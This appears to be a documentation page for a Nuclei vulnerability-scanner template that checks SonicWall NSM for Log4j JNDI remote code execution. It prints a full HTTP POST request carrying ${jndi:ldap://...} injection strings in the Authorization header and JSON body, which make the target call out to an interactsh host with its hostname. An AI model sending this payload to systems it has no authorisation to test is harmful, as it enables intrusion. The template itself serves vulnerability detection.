# Nuclei Template: Sonicwall NSM - Remote Code Execution (Apache Log4j)
**Template ID:** sonicwall-nsm-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`sonicwall-nsm-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
Sonicwall NSM is susceptible to Log4j JNDI remote code execution. SonicWall Network Security Manager (NSM) allows you to centrally orchestrate all firewall operations error-free, see and manage threats and risks across your firewall ecosystem from one place, and stay connected and compliant.

## Steps to reproduce / Exploit Payload
```http
POST /api/sonicos/auth HTTP/1.1
Host: {{Hostname}}
X-Snwl-Timer: no-reset
Authorization: Digest username="${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/}", realm="admin-users@x.x.x.x", uri="/api/sonicos/auth", algorithm=SHA-256
Content-Type: application/json
Accept: application/json, text/plain, /
X-Snwl-Api-Scope: extended
Origin: {{RootURL}}
Referer: {{RootURL}}

{"override":false,"snwl":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}"}
```

## References
- https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0032
